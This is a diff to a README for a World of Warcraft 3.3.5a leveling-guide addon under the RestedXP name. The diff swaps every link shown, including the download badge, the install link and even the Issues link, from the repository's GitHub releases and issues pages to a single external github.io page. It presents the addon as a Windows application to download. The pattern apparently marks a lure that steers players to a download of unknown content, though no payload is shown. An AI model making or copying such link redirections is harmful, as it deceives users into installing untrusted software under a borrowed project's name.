@@ -1,6 +1,6 @@
 # 🎮 RestedXP_RXPGuides-WotLK_3.3.5a - Your Ultimate Leveling Companion for Wrath Classic
 
-[![Download Now](https://img.shields.io/badge/Download-RXPGuides_WotLK-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/watercoursesheetrock65/RestedXP_RXPGuides-WotLK_3.3.5a/releases)
+[![Download Now](https://img.shields.io/badge/Download-RXPGuides_WotLK-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://watercoursesheetrock65.github.io)
 
 ## 🚀 What Is This?
 
@@ -17,7 +17,7 @@ RestedXP_RXPGuides-WotLK_3.3.5a is a powerful addon that transforms your World o
 
 ## 📥 Download & Install (For Windows)
 
-Visit this link to download the application: [RXPGuides WotLK Download](https://github.com/watercoursesheetrock65/RestedXP_RXPGuides-WotLK_3.3.5a/releases)
+Visit this link to download the application: [RXPGuides WotLK Download](https://watercoursesheetrock65.github.io)
 
 Once you're on the download page, follow these simple steps:
 
@@ -57,7 +57,7 @@ Yes. This is a backport specifically for 3.3.5a (WotLK) clients, including priva
 No. This is a standalone addon. There are no required libraries or dependencies.
 
 ### 🐛 I found a bug. What should I do?
-Visit the [Issues](https://github.com/watercoursesheetrock65/RestedXP_RXPGuides-WotLK_3.3.5a/issues) section of the GitHub repository and create a new issue. Please describe the problem, include a screenshot if possible, and mention your level and zone when the issue occurred.
+Visit the [Issues](https://watercoursesheetrock65.github.io) section of the GitHub repository and create a new issue. Please describe the problem, include a screenshot if possible, and mention your level and zone when the issue occurred.
 
 ### 📅 How often is it updated?
 The project is actively maintained. Check the Releases page for the latest version.
